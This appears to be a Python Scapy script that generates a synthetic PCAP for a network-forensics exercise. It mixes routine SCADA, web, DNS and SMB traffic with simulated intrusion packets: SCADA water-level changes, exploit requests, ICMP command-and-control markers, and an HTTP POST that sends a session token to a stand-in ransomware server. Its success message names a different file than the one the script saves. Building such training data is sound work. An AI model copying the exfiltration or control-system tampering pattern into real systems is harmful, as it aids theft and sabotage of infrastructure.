import random
from scapy.all import IP, TCP, UDP, DNS, DNSQR, ICMP, Raw, wrpcap

packets = []

for i in range(150):
    packets.append(
        IP(src="192.168.1.100", dst="192.168.1.200") /
        TCP(sport=502, dport=502, flags="PA") /
        "SCADA READ PARAMS"
    )

for i in range(20):
    packets.append(
        IP(src="203.0.113.50", dst="192.168.1.200") /
        TCP(sport=502, dport=502, flags="PA") /
        f"SCADA MODIFY PARAM Water_Level_Limit={random.randint(100, 120)}m"
    )

for i in range(80):
    packets.append(
        IP(src="192.168.1.150", dst="93.184.216.34") /
        TCP(sport=random.randint(1024, 65535), dport=80, flags="PA") /
        "GET /index.html HTTP/1.1"
    )

for i in range(30):
    packets.append(
        IP(src="203.0.113.50", dst="185.199.108.153") /
        TCP(sport=random.randint(1024, 65535), dport=443, flags="PA") /
        "GET /exploit.php HTTP/1.1"
    )

for i in range(50):
    packets.append(
        IP(src="192.168.1.150", dst="8.8.8.8") /
        UDP(sport=5353, dport=53) /
        DNS(rd=1, qd=DNSQR(qname="nukib.gov.cz"))
    )

for i in range(20):
    packets.append(
        IP(src="203.0.113.50", dst="8.8.8.8") /
        UDP(sport=5353, dport=53) /
        DNS(rd=1, qd=DNSQR(qname="jjhirapt.com.au.xyz"))
    )

for i in range(30):
    packets.append(
        IP(src="192.168.1.110", dst="192.168.1.200") /
        TCP(sport=445, dport=445, flags="PA") /
        "SMB FILE ACCESS"
    )
  
for i in range(10):
    packets.append(
        IP(src="203.0.113.50", dst="192.168.1.200") /
        TCP(sport=445, dport=445, flags="PA") /
        "SMB UNAUTHORIZED ACCESS"
    )

for i in range(30):
    packets.append(
        IP(src="203.0.113.50", dst="192.168.1.200") /
        ICMP() /
        "ICMP C2 COMMAND"
    )

# POST paket s ransomware key
http_post = (
    "POST /hidden_endpoint/receive HTTP/1.1\r\n"
    "Host: ransomware-bgsgsa-server.com\r\n"
    "User-Agent: Mozilla/5.0 (compatible)\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "\r\n"
    "id=ADMIN_PC_UBUNTU_01&session=238947239847"
    "&token=Ua8lR_CqhnPMeOr4mvL-DAs8G-ZC1GJY4AZ55o7c24w="
    "&checksum=827364827364"
)
packets.append(
    IP(src="192.168.1.150", dst="203.0.113.77") /
    TCP(sport=3717, dport=8080, flags="PA") /
    Raw(load=http_post)
)

random.shuffle(packets)

# Uloženie do PCAP súboru
wrpcap("security_log.pcap", packets)

print("✅ SCADA PCAP file 'scada_extended_traffic_with_key.pcap' was successfully created!")
